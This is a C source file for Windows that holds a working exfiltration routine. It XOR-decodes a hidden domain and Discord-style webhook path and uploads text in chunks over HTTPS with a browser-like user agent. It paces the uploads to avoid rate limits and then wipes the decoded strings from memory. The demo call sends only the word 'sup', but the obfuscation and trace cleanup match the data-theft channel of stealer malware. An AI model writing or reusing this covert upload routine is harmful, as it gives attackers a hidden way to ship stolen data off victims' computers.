#include <string.h>
#include <stdio.h>
#include <windows.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

void send_to_discord(const char* message) {
    // 1. Setup Obfuscated Data
    unsigned char obfuscated_path[] = { 0x7c, 0x52, 0x33, 0x1b, 0x4a, 0x03, 0x5a, 0x31, 0x5b, 0x2c, 0x1d, 0x0e, 0x07, 0x10, 0x62, 0x07, 0x7b, 0x40, 0x52, 0x44, 0x0f, 0x61, 0x0a, 0x72, 0x4b, 0x51, 0x4d, 0x0c, 0x60, 0x03, 0x75, 0x45, 0x53, 0x5b, 0x6f, 0x26, 0x5e, 0x34, 0x19, 0x28, 0x23, 0x4c, 0x7e, 0x06, 0x2e, 0x13, 0x2b, 0x04, 0x4f, 0x16, 0x07, 0x24, 0x30, 0x0f, 0x41, 0x7a, 0x64, 0x63, 0x27, 0x22, 0x15, 0x1d, 0x5b, 0x24, 0x5c, 0x05, 0x5f, 0x32, 0x0e, 0x06, 0x34, 0x67, 0x1b, 0x00, 0x48, 0x4c, 0x45, 0x07, 0x7a, 0x35, 0x2b, 0x26, 0x1e, 0x78, 0x63, 0x59, 0x0a, 0x41, 0x36, 0x21, 0x0a, 0x27, 0x66, 0x36, 0x35, 0x56, 0x2d, 0x4e, 0x1c, 0x56, 0x29, 0x13, 0x00 };
    unsigned char obfuscated_domain[] = { 0x34, 0x1b, 0x1c, 0x01, 0x0e, 0x10, 0x08, 0x57, 0x37, 0x07, 0x08, 0x00 };
    
    char key2[] = "S3Cret?";
    char key3[] = "ProbablyThePassword";

    size_t path_len = sizeof(obfuscated_path) - 1;
    size_t domain_len = sizeof(obfuscated_domain) - 1;
    size_t key2_len = strlen(key2);
    size_t key3_len = strlen(key3);

    // 2. Decrypt Domain and Path (Once)
    for (size_t i = 0; i < domain_len; i++) { obfuscated_domain[i] ^= key3[i % key3_len]; }
    for (size_t i = 0; i < path_len; i++) { obfuscated_path[i] ^= key2[i % key2_len]; }

    // 3. Chunking logic
    const int MAX_CHUNK_SIZE = 1900;
    int total_len = (int)strlen(message);
    int offset = 0;

    while (offset < total_len) {
        // Prepare the current chunk
        char current_chunk[2000] = { 0 };
        int current_chunk_len = (total_len - offset > MAX_CHUNK_SIZE) ? MAX_CHUNK_SIZE : (total_len - offset);
        strncpy(current_chunk, message + offset, current_chunk_len);

        // 4. Sanitize the current chunk for JSON
        char sanitized[4096] = { 0 };
        int j = 0;
        for (int i = 0; current_chunk[i] != '\0' && j < sizeof(sanitized) - 2; i++) {
            switch (current_chunk[i]) {
                case '\\': sanitized[j++] = '\\'; sanitized[j++] = '\\'; break;
                case '\"': sanitized[j++] = '\\'; sanitized[j++] = '\"'; break;
                case '\n': sanitized[j++] = '\\'; sanitized[j++] = 'n'; break;
                case '\r': sanitized[j++] = '\\'; sanitized[j++] = 'r'; break;
                case '\t': sanitized[j++] = '\\'; sanitized[j++] = 't'; break;
                default:   sanitized[j++] = current_chunk[i]; break;
            }
        }

        // 5. Prepare JSON data
        char json_data[5120];
        snprintf(json_data, sizeof(json_data), "{\"content\": \"%s\"}", sanitized);
        const char* headers = "Content-Type: application/json";

        // 6. Network Operations
        HINTERNET hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hSession) {
            HINTERNET hConnect = InternetConnectA(hSession, (char*)obfuscated_domain, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
            if (hConnect) {
                HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", (char*)obfuscated_path, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
                if (hRequest) {
                    HttpSendRequestA(hRequest, headers, (DWORD)strlen(headers), json_data, (DWORD)strlen(json_data));
                    InternetCloseHandle(hRequest);
                }
                InternetCloseHandle(hConnect);
            }
            InternetCloseHandle(hSession);
        }

        // Move to the next 1900 characters
        offset += current_chunk_len;

        // Rate limit protection: small delay between chunks
        if (offset < total_len) {
            Sleep(600); 
        }
    }

    // Cleanup sensitive data from stack
    memset(obfuscated_path, 0, sizeof(obfuscated_path));
    memset(obfuscated_domain, 0, sizeof(obfuscated_domain));
}

int main(){
	send_to_discord("sup");
	return 0;
}
